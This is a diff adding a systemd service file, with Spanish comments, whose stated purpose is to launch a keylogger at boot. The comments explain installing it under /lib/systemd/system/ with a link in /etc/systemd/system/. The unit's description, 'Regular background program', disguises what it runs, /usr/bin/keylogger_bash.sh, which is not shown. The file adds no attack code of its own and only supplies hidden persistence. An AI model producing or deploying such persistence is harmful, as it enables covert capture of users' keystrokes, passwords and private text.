@@ -1,0 +1,13 @@
+# SERVICIO PARA LANZAR EL KEYLOGGER EN EL ARRANQUE POR SYSTEMD
+#============================================================
+#...copiar en directorio /lib/systemd/system/
+#...crear un soft-link al mismo en /etc/systemd/system/
+
+[Unit]
+Description=Regular background program 
+
+[Service]
+ExecStart=/usr/bin/keylogger_bash.sh
+
+[Install]
+WantedBy=multi-user.target
